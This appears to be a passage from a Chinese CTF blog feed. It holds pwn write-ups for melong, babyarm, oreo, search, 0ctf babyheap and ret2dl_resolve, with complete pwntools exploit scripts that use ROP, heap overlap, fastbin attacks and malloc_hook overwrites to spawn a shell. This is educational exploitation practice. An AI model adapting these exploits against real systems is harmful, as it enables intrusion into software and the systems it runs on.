=&apos;DEBUG&apos;import syscontext.binary = &quot;./melong&quot;if sys.argv[1] == &quot;r&quot;: p = remote(&quot;localhost&quot;, 9999)elif sys.argv[1] == &quot;l&quot;: p = process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;./melong&quot;])else: p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;./&quot;, &quot;./melong&quot;])elf = ELF(&quot;./melong&quot;, checksec = False)libc = ELF(&quot;./lib/libc.so.6&quot;, checksec = False)def check(height,weight): p.sendlineafter(&quot;number:&quot;,&quot;1&quot;) p.sendlineafter(&quot;height(meters) :&quot;,str(height)) p.sendlineafter(&quot;weight(kilograms) :&quot;,str(weight))def exercise(): p.sendlineafter(&quot;number:&quot;,&quot;2&quot;)def register(num): p.sendlineafter(&quot;number:&quot;,&quot;3&quot;) p.sendlineafter(&quot;training?&quot;,str(num))def write(content): p.sendlineafter(&quot;number:&quot;,&quot;4&quot;) # p.sendlineafter(&apos;\n&apos;,content) p.send(content)def out(): p.sendlineafter(&quot;number:&quot;,&quot;6&quot;)pop = 0x00011bbccheck(1.58,49.8)register(-1)payload = &apos;a&apos;*0x54+p32(pop) + p32(elf.got[&apos;puts&apos;]) + p32(elf.sym[&apos;puts&apos;]) +p32(0)*7+p32(elf.sym[&apos;main&apos;])write(payload)out()p.recvuntil(&quot;See you again :)\n&quot;)put_addr = u32(p.recvn(4))print hex(put_addr)libc.address = put_addr - libc.sym[&apos;puts&apos;]print hex(libc.address)check(1.58,49.8)register(-1)pay = &quot;a&quot;*0x54 + p32(pop) + p32(next(libc.search(&quot;/bin/sh&quot;))) + p32(libc.sym[&apos;system&apos;])write(pay)out()p.interactive() 64位简单题2018 上海大学生网络安全大赛 babyarm开了nx 一眼看到了mprotect函数，一般呢有它就是改权限然后写shellcode了，上一次用这个好像是level5，emmmm碰巧这题好像也可以用这个方法做，听说是有三个参数的函数要调用和写参的话就用csu这种方法比较简单 我们知道这个题目有两层输入，第一层是不存在溢出的，第二处才存在，所以我们在第二处用csu的方法再调用回存储第一处输入的位置所以我们找一下万能gadget 我们发现mprotect的几个参数传递过程如下 mprotect是从0x411000开始的，题目中输入的地址为0x411068，所以可以让mprotect来改权限（这题好像和oj leve5不一样的是它不需要借助bss段了 关于gadget的传参 123456789ret 跳转到 x30 寄存器，一般在函数的末尾会恢复函数的返回地址到 x30 寄存器ldp x19, x20, [sp, #0x10] 从 sp+0x10 的位置读 0x10 字节，按顺序放入 x19, x20 寄存器ldp x29, x30, [sp], #0x40 从 sp 的位置读 0x10 字节，按顺序放入 x29, x30 寄存器，然后 sp += 0x40MOV X1, X0 寄存器X0的值传给X1blr x3 跳转到由Xm目标寄存器指定的地址处，同时将下一条指令存放到X30寄存器中 所以x29和x30会在x19和x20前面布置x30是存放下一个执行的地址，相当于ebp吧pc相当于rdi所以我们布置rop： 123456789101112payload = &apos;a&apos;*72 payload += p64(0x04008cc)payload += p64(0) #x29payload += p64(0x04008ac) #x30 ret-&gt;next pcpayload += p64(0) #19payload += p64(0) #20payload += p64(bss) #21 mprotect_addr payload += p64(0x7) #22 x2payload += p64(0x1000) #23 x1payload += p64(0x411000) #24 x0payload += p64(0) #next x29payload += p64(bss+0x10) #next x30 先布置完cc处的栈，然后跳回ac里执行mprotect，会再执行一遍cc，我们覆盖x30的内容为我们想它跳到的地址即可 完整的exp： 123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import syscontext.binary = &quot;./pwn&quot;context.log_level = &quot;debug&quot;if sys.argv[1] == &quot;l&quot;: p = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])elif sys.argv[1] == &quot;d&quot;: p = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;./pwn&quot;])else: p = remote(&quot;106.75.126.171&quot;, 33865)bss = 0x00411068call_mprotect = 0x0400600shellcode = asm(shellcraft.execve(&quot;/bin/sh&quot;))p.recvuntil(&quot;Name:&quot;)pay = p64(0x04007e0) #call_mprotectpay += p64(0)pay += shellcode #must in addr+0x10p.sendline(pay)payload = &apos;a&apos;*72 payload += p64(0x04008cc)payload += p64(0) #x29payload += p64(0x04008ac) #x30 ret-&gt;next pcpayload += p64(0) #19payload += p64(0) #20payload += p64(bss) #21 mprotect payload += p64(0x7) #22 x2payload += p64(0x1000) #23 x1payload += p64(0x411000) #24 x0payload += p64(0) #next x29?payload += p64(bss+0x10) #next x30sleep(0.5)p.sendline(payload)p.interactive() 参考链接： V1ct0r师傅 zs0zrc师傅]]></content>
      <tags>
        <tag>pwn知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fastbinin_attack]]></title>
    <url>%2F2020%2F02%2F07%2Ffastbinin-attack%2F</url>
    <content type="text"><![CDATA[就把wiki上的三道题稍微看了一下，了解了一下下fastbin attack，但是。。。依旧不算太清醒好了，废话不多说，开始吧 2014 hack.lu oreoadd里面的rifle name是从a288+25开始写，然后description是直接从a288处开始的，总共长度是56字节，地址占了四个字节，56-4 =52 description占25，name则占27具体看汇编v1是pre指针 为eax+52，即最后四个字节为指针地址，而这个指针指向的是description。我们可以写入的name有为56，存在溢出，可以覆写pre的地址 show这里show的内容description是指针指向的地址我们可以借此leak出libc massage进行更改的地方是a2a8里存着的地址指向的地方，利用此来get shell order这里就是free，free完之后a2a0+1 1、使pre覆写成puts_got的地址，show的时候，description里面的内容为puts_addr2、构造一个fack chunk，我们知道呢，一个chunk的结构大概是，pre_size, size,内容。我们知道a2a4的地方是写add一次就+1，a2a0是free一次+1，a2a8是存放massage指向内容的地址，可以利用这个构建一个chunk，又因为要绕过题目检查，又存name的地方也有存description的地方，所以要构造下一个chunk，把size 0x41写进去3、改一个got表为system即可，这里改的是scanf，wiki里面改的是strlen（对这个函数我不是很熟，不太懂system最后的传参，就没用了），据说还可以改free_hook 为onegadget（我不会找free_hook的地址，全网搜貌似也没搜出来用这种方法的exp） 关于wiki上的exp，看了大佬的博客之后才知道以下的姿势（关于strlen的传参）这样就相当于往0x0804a250指向的地址写入system。这里有个新姿势：system(“ls;/bin/sh”)就相当于sytem(“ls”);system(“/bin/sh”);分号代表system函数将这个参数分成两部分，先后执行里面的命令。因此这里在fgets函数篡改了strlen_got后紧接着调用strlen，就相当于system(p32(system_addr);”/bin/sh”) = system(p32(system_addr));system(“/bin/sh”);这样就能实现最终目的了。 exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *from time import sleepimport sys# context.binary = &quot;./melong&quot;context.log_level =&apos;DEBUG&apos;p = process(&apos;./oreo&apos;)elf = ELF(&apos;./oreo&apos;)libc = ELF(&apos;./libc.so.6&apos;)def add(name,description): # p.recvuntil(&quot;6. Exit!&quot;) # p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;1&quot;) # p.recvuntil(&quot;Rifle name: &quot;) p.sendline(name) # p.recvuntil(&quot;Rifle description: &quot;) p.sendline(description)def show(): # p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;2&quot;) p.recvuntil(&apos;===================================\n&apos;)def order(): # p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;3&quot;)def massage(notice): # p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;4&quot;) p.sendline(notice)p.recv()name = 27 * &apos;a&apos; + p32(elf.got[&apos;puts&apos;])add(name ,25 * &apos;a&apos;)show()p.recvuntil(&apos;===================================\n&apos;)p.recvuntil(&apos;Description: &apos;)puts_addr = u32(p.recvuntil(&apos;\n&apos;, drop=True)[:4])print hex(puts_addr)libc_base = puts_addr - libc.sym[&apos;puts&apos;]print hex(libc_base)# libc_base = libc.addresssystem_addr = libc_base + libc.sym[&apos;system&apos;]binsh_addr = libc_base + next(libc.search(&quot;/bin/sh&quot;))onegadget = libc_base + 0x5fbc6 #尝试过把scanf改成onegadget，但是五个都没成功。。。i=1for i in range(0x3f): add(&apos;a&apos; * 27 + p32(0),25 * &apos;a&apos;) #num -&gt; 0x41#num addr = 0x804A2A4#fack chunkadd(&apos;a&apos;*27+p32(0x804A2A8),&apos;a&apos;*25)massage(&apos;\x00&apos;*0x24+p32(0x41)) #description&apos;s chunkorder()scanf_got = elf.got[&apos;__isoc99_sscanf&apos;]add(&apos;a&apos;,p32(scanf_got))massage(p32(system_addr))p.sendline(&apos;/bin/sh&apos;)p.interactive() 2015 search这题就没有很认真的写wp，就把不太明白的点记一下吧 一开始一直没想到free完一次之后可以查找’\x00’这个word，就一直很迷惑要怎么double free分析两个一开始没懂的点 123456789101112131415161718192021index_sentence(&apos;a&apos; * 0x5d + &apos; d &apos;) #aindex_sentence(&apos;b&apos; * 0x5d + &apos; d &apos;) #bindex_sentence(&apos;c&apos; * 0x5d + &apos; d &apos;) #c # a-&gt;b-&gt;c-&gt;NULL search_word(&apos;d&apos;) #正常的删除 p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) p.sendline(&apos;y&apos;) p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) p.sendline(&apos;y&apos;) p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) p.sendline(&apos;y&apos;) # b-&gt;a-&gt;b-&gt;a-&gt;... search_word(&apos;\x00&apos;) #首先判断c是否满足条件，由于c是fastbin中的最后一个节点，其fd的值为0，因此不能满足i-&gt;sentence != NULL的条件，因此第一个输出时候删除的是对应的b p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) #删除b p.sendline(&apos;y&apos;) p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) #删除a p.sendline(&apos;n&apos;) p.recvuntil(&apos;Delete this sentence (y/n)?\n&apos;) #删除 libc_leak的时候添加的sentence p.sendline(&apos;n&apos;) 最后是只删除了b使得 a-&gt;b-&gt;c-&gt;null 又多了一个头变成了 b-&gt; a-&gt;b-&gt;c-&gt;null 即形成了b-&gt;a-&gt;b-&gt;a-&gt;…的循环，形成了double free 1234567891011121314 #此时的fastbin为 b-&gt;a-&gt;b# 3. fastbin attack to malloc_hook nearby chunk 向malloc_hook中写东西，改写b-&gt;fd，使其指向malloc_hook附近fake_chunk_addr = main_arena_addr - 0x33fake_chunk = p64(fake_chunk_addr).ljust(0x60, &apos;f&apos;) index_sentence(fake_chunk) #b的fd改成fake_addrs index_sentence(&apos;a&apos; * 0x60) #分配chunk_a index_sentence(&apos;b&apos; * 0x60) #分配chunk_b 填了chunk_b之后才能往fake_chunk里面写payload one_gadget_addr = libc_base + 0xf02a4 payload = &apos;a&apos; * 0x13 + p64(one_gadget_addr) payload = payload.ljust(0x60, &apos;f&apos;) index_sentence(payload) #赋写malloc_hook为one_gadget 2017 0ctf babyheap 先介绍一下Arbitrary Alloc（来自ctf wiki） 只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。 example在这个例子，我们使用字节错位来实现直接分配 fastbin 到_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。 1234567891011121314 int main(void)&#123; void *chunk1; void *chunk_a; chunk1=malloc(0x60); free(chunk1); *(long long *)chunk1=0x7ffff7dd1af5-0x8; malloc(0x60); chunk_a=malloc(0x60); return 0;&#125; 这里的 0x7ffff7dd1af5 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况。 1234567891011121314151617180x7ffff7dd1a88 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1a90 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1a98 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1aa0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1aa8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ab0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ab8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ac0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ac8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ad0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ad8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ae0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1ae8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x00x7ffff7dd1af8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x00x7ffff7dd1b08 0x0 0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x00x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30 0x28 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的 size 域。因为这个程序是 64 位的，因此 fastbin 的范围为 32 字节到 128 字节 (0x20-0x80)，如下： 12345678//这里的size指用户区域，因此要小2倍SIZE_SZFastbins[idx=0, size=0x10]Fastbins[idx=1, size=0x20]Fastbins[idx=2, size=0x30]Fastbins[idx=3, size=0x40]Fastbins[idx=4, size=0x50]Fastbins[idx=5, size=0x60]Fastbins[idx=6, size=0x70] 通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个 0x000000000000007f 12340x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x00x7ffff7dd1af8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x00x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;: 0x000000000000007f 因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。 12##define fastbin_index(sz) \ ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2) （注意 sz 的大小是 unsigned int，因此只占 4 个字节）而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。 最后经过两次分配可以观察到 chunk 被分配到 0x7ffff7dd1afd，因此我们就可以直接控制 malloc_hook 的内容 (在我的 libc 中realloc_hook 与__malloc_hook 是在连在一起的)。 1234567890x4005a8 &lt;main+66&gt; call 0x400450 &lt;malloc@plt&gt; → 0x4005ad &lt;main+71&gt; mov QWORD PTR [rbp-0x8], rax $rax : 0x7ffff7dd1afd0x7ffff7dd1aed &lt;_IO_wide_data_0+301&gt;: 0xfff7dd0260000000 0x000000000000007f0x7ffff7dd1afd: 0xfff7a92e20000000 0xfff7a92a0000007f0x7ffff7dd1b0d &lt;__realloc_hook+5&gt;: 0x000000000000007f 0x00000000000000000x7ffff7dd1b1d: 0x0000000000000000 0x0000000000000000 Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。一般都是在5或者d处（作为最后8和0结尾的地方），所以一般alloc的里面，覆盖malloc_hook的话，要 -0x33（3结尾来对齐) okk,开始进入正题在fill里面，发现可以自己重新写size再填内容，和开始alloc的大小可以不一样，然后free没有清零，以此制造overlap 第一步先 用overlap leak基址 123456789101112131415161718192021222324252627282930313233allocate(0x10)#0 00allocate(0x10)#1 20allocate(0x10)#2 40allocate(0x10)#3 60allocate(0x80)#4 80free(2)free(1)payload = &apos;a&apos;*0x10 + p64(0) +p64(0x21) + p8(0x80) #覆写最后一字节，将free掉的2指向4的地址fill(0,len(payload),payload)payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x21) #把4的size改成0x21,下一次alloc的时候可以写入这个地方fill(3,len(payload),payload)allocate(0x10)#1allocate(0x10)#2 -&gt;4payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91) #指向4之后再将大小改回来fill(3,len(payload),payload)# gdb.attach(p)allocate(0x80) #5 如果没有这个，free就没了，打不出来地址free(4)dump(2)#overlapp.recvuntil(&apos;Content: \n&apos;)main_arena = u64(p.recv(8))-0x58print hex(main_arena)print hex(libc.sym[&apos;__libc_start_main&apos;])libc_base = main_arena - 0x3C4B20#0x7F50FB4A9000‬ 第二步就构造chunk，使one_gadget能写到mollac_hook的地址里，0x80可以写下0x60的chunk 12345678//这里的size指用户区域，因此要小2倍SIZE_SZFastbins[idx=0, size=0x10]Fastbins[idx=1, size=0x20]Fastbins[idx=2, size=0x30]Fastbins[idx=3, size=0x40]Fastbins[idx=4, size=0x50]Fastbins[idx=5, size=0x60]Fastbins[idx=6, size=0x70] idx为5，则找7f，就开始提到的arbitrary alloc的方式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152allocate(0x10)#1allocate(0x10)#2 -&gt;4payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91)fill(3,len(payload),payload)# gdb.attach(p)allocate(0x80)#5free(4)dump(2)#overlapp.recvuntil(&apos;Content: \n&apos;)main_arena = u64(p.recv(8))-0x58print hex(main_arena)print hex(libc.sym[&apos;__libc_start_main&apos;])libc_base = main_arena - 0x3C4B20#0x7F50FB4A9000‬ allocate(0x60)free(4)&apos;&apos;&apos;0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL&apos;&apos;&apos;target = main_arena - 0x33 addr = p64(target)fill(2,len(addr),addr)gdb.attach(p)allocate(0x60)#4allocate(0x60)#target 6onegadget = libc_base + 0x4526apayload = &apos;a&apos;*0x13 + p64(onegadget)fill(6,len(payload),payload)allocate(0x100) 完整的exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *p = process(&apos;./babyheap&apos;)elf = ELF(&apos;./babyheap&apos;)libc = ELF(&apos;./libc.so.6&apos;)context.log_level = &apos;debug&apos;#def allocate(size): p.recvuntil(&apos;Command: &apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;Size: &apos;) p.sendline(str(size))def fill(idx, size, content): p.recvuntil(&apos;Command: &apos;) p.sendline(&apos;2&apos;) p.recvuntil(&apos;Index: &apos;) p.sendline(str(idx)) p.recvuntil(&apos;Size: &apos;) p.sendline(str(size)) p.recvuntil(&apos;Content: &apos;) p.send(content)def free(idx): p.recvuntil(&apos;Command: &apos;) p.sendline(&apos;3&apos;) p.recvuntil(&apos;Index: &apos;) p.sendline(str(idx))def dump(idx): p.recvuntil(&apos;Command: &apos;) p.sendline(&apos;4&apos;) p.recvuntil(&apos;Index: &apos;) p.sendline(str(idx))allocate(0x10)#0 00allocate(0x10)#1 20allocate(0x10)#2 40allocate(0x10)#3 60allocate(0x80)#4 80free(2)free(1)payload = &apos;a&apos;*0x10 + p64(0) +p64(0x21) + p8(0x80)fill(0,len(payload),payload)payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x21)fill(3,len(payload),payload)allocate(0x10)#1allocate(0x10)#2 -&gt;4payload = &apos;a&apos;*0x10 + p64(0)+ p64(0x91)fill(3,len(payload),payload)# gdb.attach(p)allocate(0x80)#5free(4)dump(2)#overlapp.recvuntil(&apos;Content: \n&apos;)main_arena = u64(p.recv(8))-0x58print hex(main_arena)print hex(libc.sym[&apos;__libc_start_main&apos;])libc_base = main_arena - 0x3C4B20#0x7F50FB4A9000‬ allocate(0x60)free(4)&apos;&apos;&apos;0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULL&apos;&apos;&apos;target = main_arena - 0x33 addr = p64(target)fill(2,len(addr),addr)gdb.attach(p)allocate(0x60)#4allocate(0x60)#target 6onegadget = libc_base + 0x4526apayload = &apos;a&apos;*0x13 + p64(onegadget)fill(6,len(payload),payload)allocate(0x100)p.interactive() 参考链接： https://bbs.pediy.com/thread-247214.htm https://blog.betamao.me/2018/02/25/hack-lu-ctf-2014-oreo/ https://bbs.pediy.com/thread-247219-1.htm（师傅写了两个方法，可以看看)]]></content>
      <tags>
        <tag>pwn知识点</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[runtime_resolve]]></title>
    <url>%2F2019%2F10%2F07%2Fruntime-resolve%2F</url>
    <content type="text"><![CDATA[做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位 控制程序执行 dl_resolve 函数 给定 Link_map 以及 index 两个参数。 当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。 对于此类题目：关键点： .rel.plt表 .dynsym .dynstr 从rel.plt里获得某个函数在.dynsym里的偏移 再从 .dynsym 里获得.dynstr里的偏移 在 .dynstr里找到对应的字符，将这个字符解析成函数 然后贴一段我也没有理解的东西看看 1234符号版本信息 最好使得 ndx = VERSYM[(reloc-&gt;r_info) &gt;&gt; 8] 的值为 0，以便于防止找不到的情况。重定位表项r_offset 必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。 然后参考了很多大佬的博客都提到了延迟绑定机制（就是一定要调用一次之后got表里存的才会是真实地址） 第一条的jmp的指令跳转的地址是write的got表地址，但是此时指向的是下一条指令的地址0x80483d6 push 0x20 是dl_runtime_resolve的第二个参数（reloc_arg） 然后跳到plt[0] (0x8048380) 里，将linkmap push进去，然后跳到_dl_runtime_resolve进行解析，解析后的地址将会写入到第一次的read got.plt表里，然后将程序的控制权交给解析出来的地址指向的函数(自动找到那个函数的地址) 关于四个关键函数的地址提取：plt_0 = elf.get_section_by_name(‘.plt’).header.sh_addrrel_plt = elf.get_section_by_name(‘.rel.plt’).header.sh_addrdynsym = elf.get_section_by_name(‘.dynsym’).header.sh_addrdynstr = elf.get_section_by_name(‘.dynstr’).header.sh_addr objdump -s -j .rel.plt babystackobjdump -d -j .plt babystack （直接找ida来得更快一点） readelf -S bof readelf -d bof JMPREL == .rel.pltSYMTAB == .dynsymSTRREL == .dynstrplt貌似只有-S里能找到 readelf -r bof 607 -&gt; write的.rel.plt 607&lt;&lt;8 –&gt; 6x/4wx .dynsym的地址+0x10*6 第一个参数是在str里的偏移x/s .str的地址+上面的偏移 得到的是函数名的字符串x/3i 要查函数的plt表地址 Jmp –&gt; got表地址Push –&gt; size(0x20) 是dl_runtime_resolve的第二个参数（reloc_arg）Jmp –&gt; plt[0]的地址 再——link_map = *(GOT+4) == (GOT[1]-&gt;链接器的标识信息)作为参数存入栈中GOT2是动态链接器的入口点–&gt;存着_dl_runtime_resolve的地址 _dl_runtime_resolve：完成符号的解析（内部会调用_dl_fixup）（找到真实地址存入got） —— 本题是将write的真实地址写入got，并把控制权交给write 漏洞利用方式：1、控制eip为plt[0]的地址，只需传入一个index_arg参数即可2、控制index_arg的大小，使reloc的信息存入可控地址3、伪造reloc内容，使sym在可控地址4、伪造sym内容，是name在可控地址5、伪造name为任意库函数，达到我们想要的效果 我们来分步完成我们想要的效果吧（有write的函数其实就不需要这个方法了吧…） Part1：直接用write函数，查看最后输出效果 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *p = process(&apos;./bof&apos;)elf = ELF(&apos;./bof&apos;)rel_plt = 0x08048330plt_0 = 0x08048380dynsym = 0x080481d8dynstr = 0x08048278leave_ret = 0x08048458pop_ebp = 0x0804861b ppp_ret = 0x08048619 #pop esi ; pop edi ; pop ebp ; retbss_addr = 0x0804a040 #readelf -S bof | grep &quot;.bss&quot;stack_size = 0x800base_stage = bss_addr + stack_sizeread_plt = elf.plt[&apos;read&apos;]write_plt = elf.plt[&apos;write&apos;]write_got = elf.got[&apos;write&apos;]fake_sym_addr = base_stage + 36 align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 r_info = index_dynsym &lt;&lt; 8 | 0x7fake_reloc = p32(write_got) + p32(r_info) st_name = fake_sym_addr + 0x10 - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)index_offset = (base_stage + 28) - rel_plt#stage 1 bss_addrpayload = &quot;a&quot;*112 payload += p32(read_plt) # 读100个字节到base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp) # 把base_stage pop到ebp中payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stagep.sendline(payload)cmd = &quot;/bin/sh\x00&quot;payload1 = &apos;aaaa&apos;payload1 += p32(write_plt)payload1 += &apos;aaaa&apos;payload1 += p32(1)payload1 += p32(base_stage+80)payload1 += p32(len(cmd))payload1 += &apos;A&apos; * (80 - len(payload1))payload1 += cmdpayload1 += &apos;A&apos; * (100 - len(payload1))p.sendline(payload1)p.interactive() “/bin/sh“被打出来了 Part 2控制eip为pit[0]地址 12345678910111213141516cmd = &quot;/bin/sh\x00&quot;plt_0 = 0x08048380 # objdump -d -j .plt bofindex_offset = 0x20 # write&apos;s indexpayload2 = &apos;aaaa&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;aaaa&apos;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmd payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() Part 3控制index_offset 指向fake_reloc 123456789101112131415161718192021cmd = &quot;/bin/sh\x00&quot;plt_0 = 0x08048380 # objdump -d -j .plt bofrel_plt = 0x08048330 # objdump -s -j .rel.plt bofindex_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移write_got = elf.got[&apos;write&apos;]r_info = 0x607 # write: Elf32_Rel-&gt;r_infofake_reloc = p32(write_got) + p32(r_info)payload2 = &apos;aaaa&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;aaaa&apos;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmd payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() Part 4伪造fake_sym 指向st_name 12345678910111213141516171819202122232425262728293031cmd = &quot;/bin/sh\x00&quot;plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&apos;write&apos;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = 0x4cfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &apos;AAAA&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;AAAA&apos;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += &apos;B&apos; * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += &apos;A&apos; * (80 - len(payload2))payload2 += cmd payload2 += &apos;A&apos; * (100 - len(payload2))p.sendline(payload2)p.interactive() Part 5St_name指向 ‘write’，继续回显 1234567891011121314151617181920212223242526272829303132plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&apos;write&apos;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &apos;AAAA&apos;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &apos;AAAA&apos;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # 